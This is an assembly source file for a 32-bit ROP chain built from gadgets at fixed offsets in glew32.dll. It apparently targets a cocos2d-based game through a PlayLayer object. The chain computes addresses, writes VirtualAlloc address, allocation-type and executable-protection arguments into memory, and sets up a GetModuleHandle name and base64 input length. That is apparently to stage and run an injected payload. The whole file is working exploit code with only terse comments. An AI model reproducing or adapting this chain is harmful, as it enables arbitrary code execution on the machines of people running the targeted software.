BITS 32

; glew32.dll base address
%define G 0x62aa0000
%define DONTCARE 0x11111111

; edi = add esp, 8
; ebx = eax = PlayLayer*

dd G + 0x2010 ; ebp (random readable address)

; dd G + 0x18bc3 ; pop eax

; dd G + 0x180ce ; mov dword ptr [esp + 0x34], eax; call edi; [noret]
; dd DONTCARE

; keep esi somewhere in the rop for later
dd G + 0x193d6 ; push esi; call edi; [noret]
; nothing skipped due to push esi

; add 0x22c+0x37 to eax
times ((0x22c + 0x37) / 8) dd G + 0x18bdb ; add eax, 8
times ((0x22c + 0x37) % 8) dd G + 0x19248 ; add eax, 1

dd G + 0x1229 ; pop ebx
dd -8

dd G + 0x16426 ; pop ecx
dd G + 0xcc48 ; add esp, 8

; reset edx
dd G + 0x1b1e0 ; xor edx, edx; xor esi, esi; xor edi, edi; call ecx;
dd DONTCARE

; set ebx = [eax-0x37] - 8
dd G + 0x18215 ; add ebx, dword ptr [eax - 0x37]
; set edx=ebx
dd G + 0x1d01e ; add edx, ebx; pop ebx; ret 0x10
dd -8 ; ebx
dd G + 0x18e6a ; mov eax, edx
dd DONTCARE
dd DONTCARE
dd DONTCARE
dd DONTCARE

; add 0x118+8+0x37 to eax
times ((0x118 + 8 + 0x37) / 8) dd G + 0x18bdb ; add eax, 8
times ((0x118 + 8 + 0x37) % 8) dd G + 0x19248 ; add eax, 1

; set ebx = [eax-0x37] - 8
dd G + 0x18215 ; add ebx, dword ptr [eax - 0x37]

; reset edx
dd G + 0x1b1e0 ; xor edx, edx; xor esi, esi; xor edi, edi; call ecx;
dd DONTCARE

; set edx=ebx
dd G + 0x1d01e ; add edx, ebx; pop ebx; ret 0x10
dd -8 ; ebx
dd G + 0x18e6a ; mov eax, edx
dd DONTCARE
dd DONTCARE
dd DONTCARE
dd DONTCARE

; ----- set addr ----

dd G + 0x16426 ; pop ecx
dd -(virtualalloc_addr+8)
dd G + 0x1acea ; sub eax, ecx

dd G + 0x16426 ; pop ecx
dd 0x80808080 ; the 128s bit must be set and nothing else in the LSB, others dont matter

; this is equivalent to a left shift by 1
times 25 dd G + 0x17f85 ; add ecx, ecx

dd G + 0x1711d ; mov dword ptr [eax], ecx; xor eax, eax; pop esi
dd DONTCARE ; esi

; ----- set type low bits ----

dd G + 0x18e6a ; mov eax, edx

dd G + 0x16426 ; pop ecx
dd -(virtualalloc_type+8)
dd G + 0x1acea ; sub eax, ecx

dd G + 0x16426 ; pop ecx
dd 0x01010180

times 5 dd G + 0x17f85 ; add ecx, ecx

; ecx = 0x20203000

dd G + 0x1711d ; mov dword ptr [eax], ecx; xor eax, eax; pop esi
dd DONTCARE ; esi

; ----- set type high bits and prot low bits ----

dd G + 0x18e6a ; mov eax, edx

dd G + 0x16426 ; pop ecx
dd -(virtualalloc_type+2+8)
dd G + 0x1acea ; sub eax, ecx

dd G + 0x16426 ; pop ecx
dd 0x80808080

times 15 dd G + 0x17f85 ; add ecx, ecx

; ecx = 0x20203000

dd G + 0x1711d ; mov dword ptr [eax], ecx; xor eax, eax; pop esi
dd DONTCARE ; esi

; ----- set prot high bits ----

dd G + 0x18e6a ; mov eax, edx

dd G + 0x16426 ; pop ecx
dd -(virtualalloc_prot+1+8)
dd G + 0x1acea ; sub eax, ecx

dd G + 0x16426 ; pop ecx
dd 0x80808062

times 24 dd G + 0x17f85 ; add ecx, ecx

; ecx = 0

dd G + 0x1711d ; mov dword ptr [eax], ecx; xor eax, eax; pop esi
dd DONTCARE ; esi

; ----- set b64 inlen ----

dd G + 0x18e6a ; mov eax, edx

dd G + 0x16426 ; pop ecx
dd -(virtualalloc_prot+1+8)
dd G + 0x1acea ; sub eax, ecx

dd G + 0x16426 ; pop ecx
dd 0x80808080

times 25 dd G + 0x17f85 ; add ecx, ecx

; ecx = 0

dd G + 0x1711d ; mov dword ptr [eax], ecx; xor eax, eax; pop esi
dd DONTCARE ; esi

; ----- set gmh name ----

dd G + 0x18e6a ; mov eax, edx

dd G + 0x16426 ; pop ecx
dd -(cocos+8)
dd G + 0x1acea ; sub eax, ecx

dd G + 0x1cfdd ; mov ecx, eax; mov eax, esi; pop esi; ret 0x10
dd DONTCARE ; esi
dd G + 0x18e6a ; mov eax, edx
dd DONTCARE
dd DONTCARE
dd DONTCARE
dd DONTCARE

dd G + 0x177bd ; pop edi
dd G + 0xcc48 ; add esp, 8

;dd G + 0x19441 ; add eax, 0xb4; push eax; call edi; [noret]

dd G + 0x1711d ; mov dword ptr [eax], ecx; xor eax, eax; pop esi
dd DONTCARE ; esi

; ----- set b64 input name ----

dd G + 0x18e6a ; mov eax, edx

dd G + 0x16426 ; pop ecx
dd -(cocos+8)
dd G + 0x1acea ; sub eax, ecx

dd G + 0x1cfdd ; mov ecx, eax; mov eax, esi; pop esi; ret 0x10
dd DONTCARE ; esi
dd G + 0x18e6a ; mov eax, edx
dd DONTCARE
dd DONTCARE
dd DONTCARE
dd DONTCARE

;dd G + 0x19441 ; add eax, 0xb4; push eax; call edi; [noret]

dd G + 0x1711d ; mov dword ptr [eax], ecx; xor eax, eax; pop esi
dd DONTCARE ; esi

virtualalloc_addr:
virtualalloc_type:
virtualalloc_prot:
cocos:
